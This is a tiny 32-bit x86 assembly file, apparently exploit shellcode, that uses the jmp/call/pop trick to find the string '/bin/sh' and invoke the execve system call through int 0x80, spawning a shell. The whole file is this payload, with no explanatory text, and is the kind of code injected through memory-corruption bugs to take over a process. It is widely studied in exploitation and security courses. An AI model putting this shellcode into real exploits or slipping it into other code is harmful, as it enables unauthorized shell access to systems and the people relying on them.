.global shellcode

shellcode:
    jmp ender

starter:
    pop %ebx
    xor %edx, %edx
    xor %ecx, %ecx
    mov $0xb, %al
    int $0x80
    ret

ender:
    call starter
    .string "/bin/sh"
    
